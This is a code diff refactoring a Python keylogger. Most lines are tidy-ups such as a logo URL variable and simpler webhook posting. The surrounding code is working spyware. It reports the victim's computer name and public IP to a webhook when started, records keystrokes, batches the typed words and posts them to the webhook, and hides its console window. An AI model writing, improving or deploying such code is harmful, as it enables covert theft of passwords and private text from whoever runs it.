@@ -11,9 +11,9 @@ from queue import Queue
 import threading
 
 webhook_url = "WEBHOOK_LINK_HERE"
+logo_url = "YOUR_LOGO_LINK_HERE"
 
 pc_name = os.getenv('COMPUTERNAME')
-
 public_ip = requests.get("https://httpbin.org/ip").json()["origin"]
 
 requests.post(webhook_url, json={"content": f"{pc_name} ({public_ip}) opened the logger!"})
@@ -23,7 +23,7 @@ word_buffer = Queue()
 
 def on_special_key_press(key):
     key_name = get_key_name(key)
-    if key_name is not None:
+    if key_name:
         word_buffer.put(key_name)
 
 def on_press(key):
@@ -31,7 +31,7 @@ def on_press(key):
 
     if key == keyboard.Key.space:
         word_buffer.put("".join(current_word))
-        current_word = []
+        current_word.clear()
     else:
         try:
             char = key.char
@@ -62,13 +62,13 @@ def send_words_to_webhook():
                     "text": f"Public IP: {public_ip}"
                 },
                 "thumbnail": {
-                    "url": "YOUR_LOGO_LINK_HERE"
+                    "url": logo_url
                 }
             }
             payload = {
                 "embeds": [embed]
             }
-            requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"})
+            requests.post(webhook_url, json=payload)
 
 def get_key_name(key):
     key_mapping = {
@@ -80,10 +80,7 @@ def get_key_name(key):
         Key.shift_r: "Key.shift"
     }
 
-    if isinstance(key, KeyCode):
-        return key_mapping.get(key, None)
-    else:
-        return str(key) if key is not None else None
+    return key_mapping.get(key, str(key) if key else None)
 
 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
